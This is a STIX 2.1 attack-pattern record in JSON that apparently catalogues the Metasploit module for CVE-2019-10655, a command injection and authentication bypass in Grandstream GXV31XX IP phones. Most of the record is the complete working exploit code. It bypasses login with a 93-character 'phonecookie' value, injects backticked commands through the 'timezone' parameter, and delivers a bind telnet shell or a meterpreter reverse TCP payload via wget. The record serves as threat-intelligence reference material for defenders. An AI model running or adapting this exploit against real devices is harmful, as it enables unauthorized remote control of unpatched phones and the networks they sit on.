{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c1c4fae-583a-4a26-8bc4-7d85d651313b",
    "created": "2024-08-14T17:04:02.497333Z",
    "modified": "2024-08-14T17:04:02.497337Z",
    "name": "\"Grandstream GXV31XX settimezone Unauthenticated Command Execution\"",
    "description": " This module exploits a command injection vulnerability in Grandstream GXV31XX IP multimedia phones. The 'settimezone' action does not validate input in the 'timezone' parameter allowing injection of arbitrary commands.  A buffer overflow in the 'phonecookie' cookie parsing allows authentication to be bypassed by providing an alphanumeric cookie 93 characters in length.  This module was tested successfully on Grandstream models: GXV3175v2 hardware revision V2.6A with firmware version 1.0.1.19; and GXV3140 hardware revision V0.4B with firmware version 1.0.1.27. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/grandstream_gxv31xx_settimezone_unauth_cmd_exec.rb",
            "external_id": "grandstream_gxv31xx_settimezone_unauth_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10655"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=23920"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/dirtyfilthy/gxv3175-remote-code-exec/blob/master/modules/exploits/linux/http/grandstream_gxv3175_cmd_exec.rb"
        },
        {
            "source_name": "linemax:220",
            "external_id": "#255minusURLencoding"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Deprecated\n\n  moved_from 'exploit/linux/http/grandstream_gxv3175_settimezone_unauth_cmd_exec'\n\n  HttpFingerprint = { pattern: [ /Multimedia Phone/ ] }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Grandstream GXV31XX 'settimezone' Unauthenticated Command Execution\",\n        'Description' => %q{\n          This module exploits a command injection vulnerability in Grandstream GXV31XX\n          IP multimedia phones. The 'settimezone' action does not validate input in the\n          'timezone' parameter allowing injection of arbitrary commands.\n\n          A buffer overflow in the 'phonecookie' cookie parsing allows authentication\n          to be bypassed by providing an alphanumeric cookie 93 characters in length.\n\n          This module was tested successfully on Grandstream models:\n          GXV3175v2 hardware revision V2.6A with firmware version 1.0.1.19; and\n          GXV3140 hardware revision V0.4B with firmware version 1.0.1.27.\n        },\n        'Author' => [\n          'alhazred', # Command injection vulnerability discovery and exploit\n          'Brendan Scarvell', # Auth bypass discovery\n          'bcoles' # Metasploit\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix linux],\n        'References' => [\n          [ 'CVE', '2019-10655' ],\n          [ 'URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=23920' ],\n          [ 'URL', 'https://github.com/dirtyfilthy/gxv3175-remote-code-exec/blob/master/modules/exploits/linux/http/grandstream_gxv3175_cmd_exec.rb' ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        },\n        'DisclosureDate' => '2016-09-01',\n        'Privileged' => true,\n        'CmdStagerFlavor' => %w[wget],\n        'Targets' => [\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd'\n              }\n            }\n          ],\n          [\n            'Linux (ARMLE)', {\n              'Arch' => ARCH_ARMLE,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PrependFork' => true,\n                'MeterpreterTryToFork' => true,\n                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',\n                'CMDSTAGER::FLAVOR' => 'wget'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def send_manager_request(vars_get)\n    send_request_cgi(\n      'uri' => '/manager',\n      'cookie' => \"phonecookie=\\\"#{rand_text_alpha(93)}\\\"\",\n      'vars_get' => vars_get\n    )\n  end\n\n  def check\n    res = send_manager_request(\n      'action' => 'settimezone',\n      'timezone' => ''\n    )\n\n    if res && res.code == 200 && res.body.to_s.include?('Response=Success')\n      return CheckCode::Detected('phonecookie authentication bypassed successfully.')\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    res = send_manager_request(\n      'action' => 'settimezone',\n      'timezone' => \"`#{cmd}`\"\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply (HTTP #{res.code})\")\n    end\n    unless res.body.to_s.include?('Response=Success')\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply (#{res.body.length} bytes)\")\n    end\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(\n        linemax: 220, # 255 minus URL encoding\n        background: true\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}